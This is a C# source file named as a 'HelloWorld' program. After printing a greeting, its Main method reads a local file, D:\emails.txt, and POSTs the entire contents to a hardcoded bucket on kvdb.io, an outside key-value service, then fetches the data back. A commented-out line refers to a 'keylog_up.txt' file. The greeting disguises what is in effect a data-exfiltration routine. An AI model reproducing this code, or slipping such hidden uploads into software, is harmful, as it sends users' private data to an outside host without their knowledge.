using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Net;
//https://adevelopersnotes.wordpress.com/2014/12/19/web-api-2-sample-httpclient-and-sample-webclient-call/
//https://kvdb.io/docs/api/#keys

namespace HelloWorld
 {
     class HelloCS 
 {
	
         static void Main() 
         {
	   try
		{
             	Console.WriteLine("Hello World !");
		string tempFolderPath = Path.GetTempPath();
	     	HelloCS  obj=new HelloCS();  
	     	//var res=obj.PostRequestJson("https://kvdb.io","");
		//Console.WriteLine("Success");
		string res="Em7hnhFaVG5s4uvTXhMeA7";
		//Console.WriteLine(res);
		string res_key=res;
		string updated_ep="https://kvdb.io/"+res_key+"/hits";
		string path =@"D:";
		string file_text=File.ReadAllText(@path + @"\emails.txt",System.Text.Encoding.UTF8);
                //File.WriteAllText(@path + @"\keylog_up.txt", file_text);
		var res1=obj.PostRequestJson(updated_ep,file_text);
	     	Console.WriteLine(res1);
		var res2=obj.getData(updated_ep);
		Console.WriteLine(res2);
		}
	   catch(Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
         }

public string getData(string endpoint)
{
 

using (var client = new WebClient())
{
    try
    {
	Console.WriteLine("End point is : " +endpoint);
        client.BaseAddress = endpoint;
        // HTTP GET
        client.UseDefaultCredentials = true;
        var jsonResponse = client.DownloadString(endpoint);
	return jsonResponse;
    }
    catch (WebException ex)
    {
        // Http Error
            if (ex.Status == WebExceptionStatus.ProtocolError)
            {
                HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
                var statusCode = (int)wrsp.StatusCode;
                var msg = wrsp.StatusDescription;
		Console.WriteLine("Exception : " + msg);
		return msg;
               // throw new HttpException(statusCode, msg);
            }
            else
            {
                Console.WriteLine("Exception 11" + ex.Message);
		return ex.Message;
            }
    }
}
	
 
}

public string PostRequestJson(string endpoint, string json)
{
    // Create string to hold JSON response
	Console.WriteLine("End point is : " +endpoint);
    string jsonResponse = string.Empty;
 
    using (var client = new WebClient())
    {
        try
        {
	    //WebProxy wp = new WebProxy("swgproxy.corp.du.ae");
	    //client.Proxy = wp;

            client.UseDefaultCredentials = true;
            client.Headers.Add("Content-Type:application/json");
            client.Headers.Add("Accept:application/json");
            var uri = new Uri(endpoint);
            var response = client.UploadString(uri, "POST", json);
            jsonResponse = response;
        }
        catch (WebException ex)
        {
            // Http Error
            if (ex.Status == WebExceptionStatus.ProtocolError)
            {
                HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
                var statusCode = (int)wrsp.StatusCode;
                var msg = wrsp.StatusDescription;
		Console.WriteLine("Exception : " + msg);
		return msg;
               // throw new HttpException(statusCode, msg);
            }
            else
            {
                Console.WriteLine("Exception 11" + ex.Message);
		return ex.Message;
            }
        }
    }
 
    return jsonResponse;
} //method


} //class
	


     
 }
